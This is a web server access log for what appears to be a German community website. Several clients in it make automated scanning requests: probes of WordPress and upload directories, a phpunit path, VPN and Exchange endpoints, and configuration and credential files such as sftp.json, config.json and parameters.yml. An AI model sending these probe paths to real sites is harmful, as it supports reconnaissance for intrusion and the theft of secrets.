user;timestamp;referer;target;method;status
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:50;/;/.well-known/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:51;/;/ALFA_DATA/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:52;/;/.well-knownold/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:53;/;/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:54;/;/upload/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:55;/;/admin/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:56;/;/Admin/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:56;/;/admin/;GET;302
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:56;/;/login;GET;200
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:57;/;/images/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:57;/;/assets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:57;/;/vendor/phpunit/phpunit/src/Util/PHP/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:58;/;/upload/image/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:58;/;/assets/images/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:59;/;/Public/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:01;/;/vendor/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:02;/;/local/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:03;/;/modules/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:04;/;/Site/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:05;/;/system/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:07;/;/template/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:08;/;/shop/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:09;/;/files/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:09;/;/admin/editor/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:10;/;/include/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:10;/;/Assets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:11;/;/images/stories/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:12;/;/plugins/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:12;/;/php/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:12;/;/wp-includes/assets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:13;/;/wp-includes/Text/Diff/Engine/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:13;/;/wp-includes/block-patterns/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:13;/;/wp-includes/Text/Diff/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:14;/;/wp-includes/block-supports/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:14;/;/wp-includes/SimplePie/Cache/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:15;/;/wp-includes/SimplePie/Content/Type/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:15;/;/wp-includes/SimplePie/Content/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:15;/;/wp-includes/rest-api/endpoints/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:16;/;/wp-includes/rest-api/fields/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:19;/;/wp-includes/Requests/Cookie/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:19;/;/wp-includes/Requests/Proxy/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:20;/;/wp-includes/Requests/Response/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:22;/;/wp-includes/Requests/Transport/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:22;/;/wp-includes/Requests/Utility/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:23;/;/wp-includes/js/codemirror/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:23;/;/wp-includes/Requests/Exception/HTTP/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:23;/;/wp-includes/js/crop/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:24;/;/wp-includes/images/crystal/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:24;/;/wp-includes/images/media/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:26;/;/wp-includes/images/smilies/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:26;/;/wp-includes/images/wlw/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:26;/;/wp-includes/rest-api/search/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:27;/;/wp-includes/Requests/Exception/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:27;/;/wp-includes/Requests/Auth/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:29;/;/wp-includes/sodium_compat/src/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:30;/;/wp-includes/sitemaps/providers/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:30;/;/wp-includes/Text/Diff/Engine/Engine/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:31;/;/wp-includes/html-api/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:31;/;/wp-includes/php-compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:32;/;/wp-includes/PHPMailer/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:32;/;/wp-includes/random_compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:33;/;/wp-includes/sitemaps/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:34;/;/wp-includes/sodium_compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:34;/;/wp-includes/style-engine/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:35;/;/wp-includes/theme-compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:36;/;/wp-admin/css/colors/ectoplasm/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:36;/;/wp-admin/css/colors/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:37;/;/admin/images/slider/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:37;/;/admin/fckeditor/editor/filemanager/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/sites/default/files/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/admin/controller/extension/extension/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/modules/mod_simplefileuploadv1.3/elements/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/components/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:39;/;/admin/uploads/images/;GET;404
c59b51e8fe46fda721c0b46320a60ad90add930500539cc213bc2f8294ee755b;2025-11-25 02:53:04;;/;GET;200
e4572885706b05f4fddf01a06092981120f175c4992682b80de42c645cd3657c;2025-11-25 02:54:38;;/sitemap.xml;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-25 02:55:43;/;/;GET;200
4dfdfc357d4c025fd1b2920b3dcf85ae8f7b73c5b898fbb29580ae03c06bf66c;2025-11-25 03:09:18;/;/;GET;200
656a1dbedd097264b29d4c0389272bac3db8ad66ee45691db156e48758e7274b;2025-11-25 03:20:32;;/;GET;200
4e81e9dc68a82e2b4cbe181222dc8c53a743929279a86562e2e32896dbab7c01;2025-11-25 03:22:43;;/rechtliches/nutzungsbedingungen;GET;200
8ac20f22ae87d70d0edc30a67bdf7a817716709356a43b6198a6c30bb75ec3f9;2025-11-25 03:24:38;;/personen/alumni/schule/59000;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-25 03:46:55;/;/;PROPFIND;405
4ad3b9584367970d98025475e19262b77f2a4f210d19e1ea99b77d418541e59a;2025-11-25 04:02:10;/;/;GET;200
e887c35cb3a93bc576d119b8ab127ee19c49e6e47e6f8730ef9bae8947de817e;2025-11-25 04:06:02;;/;GET;200
6a597af15cac5754dd91a1c32477527d9f6b93d276cea5a899ddcc934e374c96;2025-11-25 04:06:30;;/;GET;200
d0102a20aceaf41e13bcbca046745fa99ee103f7b93a8904e221bba4a0206d24;2025-11-25 04:07:33;;/gruppen;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-25 04:09:18;;/rechtliches/impressum;GET;200
e796d039602ba67a09a5adc86b4c3d18601b91518f1f4249c63e8bbabce85319;2025-11-25 04:15:36;;/;GET;200
d8a115880ec4f11b1b43c956a3a57c24ad4e112e5d1f6d6fe151f515f8544eec;2025-11-25 04:17:51;;/;GET;200
8053768d98a4e7f8f16a0e3ee00c9e0efcb9370641c9d8505dddaf97c7a7cea8;2025-11-25 04:19:53;;/;GET;200
05ec565ef2bc8430670c3542419611717efcbcb9764e3ca38eae9fa9adeb6819;2025-11-25 04:21:20;;/;GET;200
f5891b8328c6adb3bb3c4318598e51527687bbd4826c9d99370cd7262216d394;2025-11-25 04:24:34;;/;GET;200
a176c93321a22e717da79e6ee7c955ac600d523c1efe3cd85a88048318024df5;2025-11-25 04:31:52;;/;GET;200
86e36026d534d7d55aa71326f1e6cf1d66374546e1be7de78e9751ff71985973;2025-11-25 04:34:30;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-25 04:40:00;/;/;PROPFIND;405
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-25 04:41:01;;/sitemap.xml;GET;200
95d0c782850e9d73d64dea979c20ea57217fdcc0e1c824489c81591a23a31c3c;2025-11-25 04:41:22;;/htmx/get;GET;405
c5e775ee7693a62d3fd7c1daf9a8c9192aa5ceee061faae5916d9e4468b158a9;2025-11-25 04:42:02;;/6627437333;GET;404
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-25 04:47:01;;/htmx/get;GET;405
95adb14617c2c2d58e416757323074db7d92427d72e5785afd85827df32dc46f;2025-11-25 04:47:06;;/unsubscribe;GET;302
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-25 04:47:31;;/htmx/get;GET;405
a6a505994c8728747f54021d88b6459fca7e829e432a4dcb4eeaf4088a25e7db;2025-11-25 04:49:22;;/;GET;200
a6a505994c8728747f54021d88b6459fca7e829e432a4dcb4eeaf4088a25e7db;2025-11-25 04:49:32;;/;GET;200
60a3b8a34de89a248b264a70196cc84d57bf76418a2ece95a1d05927134245d3;2025-11-25 04:53:41;;/;GET;200
4d4559860ebe13cf6a03d2b1ce66e25fcdb8c1bc42c34b4a8cf0a52d32bd2e0a;2025-11-25 04:57:34;;/;GET;200
07a9f464d7e7ce196cd7e854d9b15d107cd72407f52243deb2c242e14fb63d8f;2025-11-25 04:59:50;;/aktuelles/stellenangebote;GET;200
cf525f140094ccf621ba2aeedb7039d2a9dbea7232bab7a7fdf0f0a65fd6baa5;2025-11-25 05:05:34;;/;GET;200
755f8aef7e2f37ee28b827a53461b982b70f576421295bc0183279e37ade5663;2025-11-25 05:20:44;;/;GET;200
f986f0faa45750b85ba686905f0e5053922871f996c68fcfd659e46a67f235a3;2025-11-25 05:32:09;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
ea4d506d83a385cdefa7246b64e26097cdff76b668f5a1dda5ef977e84fa0170;2025-11-25 05:35:00;;/themen/details/abschied-aus-moabit;GET;200
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:29;;/;GET;200
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:29;;//wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;//xmlrpc.php?rsd;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;/;GET;200
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;//blog/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:30;;//web/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//website/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//wp/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:31;;//news/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//2018/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//2019/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//shop/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:32;;//wp1/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//test/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//media/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//wp2/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:33;;//site/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:34;;//cms/wp-includes/wlwmanifest.xml;GET;404
8e43f7e6e013898e064b2fa283e675845f3d7b583d2dabc94b312afc8e56dcb5;2025-11-25 05:49:34;;//sito/wp-includes/wlwmanifest.xml;GET;404
c5a9fee80ff30cbdb6aeb19d70d1a738aaf35549b26ed00361d53d3d166f898a;2025-11-25 06:05:36;;/media/cache/post_thumbnail/images/blogpost/pexels-karolina-grabowska-8107761-1741718125.jpg;GET;404
07a2bc25b91d6c41bc29e4033d4c452fa2318dfa68773c110e0acfe92f8a6a67;2025-11-25 06:08:15;;/;GET;200
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:13:57;;/;GET;200
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:02;;/;GET;200
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:12;;/.DS_Store;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:13;;/.vscode/sftp.json;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:14;;/phpinfo.php;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:15;;/info.php;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:16;;/idx_config/;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:18;;/_profiler/open?file=config/parameters.yml;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:19;;/config.json;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:19;;/;UNKNOWN;405
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:20;;/app_dev.php/_profiler/open?file=config/parameters.yml;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:21;;/debug/default/view?panel=config;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:23;;/server-status;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:24;;/_profiler/phpinfo;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:25;;/phpinfo;GET;404
eaf3929111d2de7e855add8180f61f75f75810d34a2345bcbfc5032fe0bef8ef;2025-11-25 06:14:26;;/telescope/requests;GET;404
8ed98f351d170b944e1fab2f89a2b7c07184f91dc81e31b18966a33bd620cb01;2025-11-25 06:17:11;;/;GET;200
3d26b1ba38a2b067d2d9cdb27e80b45e14a75bdb972c7e2a4a340184077f948f;2025-11-25 06:20:56;;/;GET;200
da2c52833197dfa23769515cce8e28bb0669d2cb85c8c765e2f9d5925e41c6e2;2025-11-25 06:21:17;;/;GET;200
407d514275c6a4ac11426289717cd074d5e02ba282fe91f4f27657d8ce7a6e18;2025-11-25 06:22:08;;/gruppen/hobby/teamsportarten;GET;302
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-25 06:29:43;;/?XDEBUG_SESSION_START=phpstorm;GET;200
0f05ced56245bfcaad57cca7c268c060d48f90d985e66935cf94bea1d9603b7a;2025-11-25 06:30:59;/;/;GET;200
ea2daa15ff92b4d537aa803edf5a10788166b63a082d72396164b245203a49cd;2025-11-25 06:31:29;/;/;GET;200
9ba2b4ea72b222c7e6a679670752d934b98affe499d8b99a43f58333663100b9;2025-11-25 06:32:01;/wsman;/wsman;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:31;/;/;GET;200
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:32;/auth.html;/auth.html;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:33;/auth1.html;/auth1.html;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:33;/sslvpnLogin.html;/sslvpnLogin.html;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:34;/api/sonicos/auth;/api/sonicos/auth;GET;404
daef66e636eb2e6eb8fdde4583f1e82e4a4574db40ddb81b3504bd52518da97e;2025-11-25 06:32:34;/api/sonicos/tfa;/api/sonicos/tfa;GET;404
c7d22af7871562cad20da9e81beaa2981c54ffdcc2187e2b42ea14e479da846f;2025-11-25 06:33:06;;/;GET;200
c7d22af7871562cad20da9e81beaa2981c54ffdcc2187e2b42ea14e479da846f;2025-11-25 06:39:56;;/;GET;200
cbb74a4970d9bb6238673e34303ccbe5c60f31eaed89861065ea6a41abcc65e7;2025-11-25 06:47:01;;/;GET;200
5604d377d4094951a6cf0f5230fabf8e5a3dc814de21503b097406b2738dbde2;2025-11-25 06:50:17;;/;GET;200
6bccd29d0a80eae32a259f536f37747210ebd430c3d9916ea64119a72403fa33;2025-11-25 06:59:28;;/;GET;200
094e6b480537ae099b0f7926c41735b5bb82b50185bb51fe43afa1bef330ff96;2025-11-25 07:07:20;;/;GET;200
2fd757c31ae6606c441c8e3fc0c27db20e18227f8831656b7677ee0b5b46c991;2025-11-25 07:08:32;;/;GET;200
b6a0a73bc98489a39b63ac1cde69dd0fd2673406f92467b4a2174559f9569574;2025-11-25 07:10:18;;/rechtliches/nutzungsbedingungen;GET;200
51e350fcc28b84adb205c447e954d1007c60043934fac87c0690724955adf92f;2025-11-25 07:18:43;;/;GET;200
ee8f1cc8e9a2a500dd49d2485f97114140ad790ecc38c362e921f767d271142b;2025-11-25 07:22:24;;/;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:31;;/ab2g;GET;404
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:31;;/ab2h;GET;404
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:31;;/alive.php;GET;404
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:32;;/;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:32;;/;GET;200
8583b6da3f10a94565386889432403fafe4a2b4813e30bb3b0a513a2422bd982;2025-11-25 07:22:32;;/teorema505?t=1;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-25 07:28:31;/gruppen/hobby/musikinstrumente-spielen;/profile;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-25 07:28:32;/gruppen/hobby/musikinstrumente-spielen;/login;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-25 07:29:55;/gruppen/hobby/musikinstrumente-spielen;/gruppen/hobby/statistik;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-25 07:29:56;/gruppen/hobby/musikinstrumente-spielen;/gruppen;GET;200
2703f8782fc80dfa734b07527b690df1099bbb1c2176cccbddf18f05feee8cb1;2025-11-25 07:32:58;;/;GET;200
024526d69a5daf2912616bec62d04b83b64ff48a35f620e64089904f0aca936e;2025-11-25 07:39:22;;/;GET;200
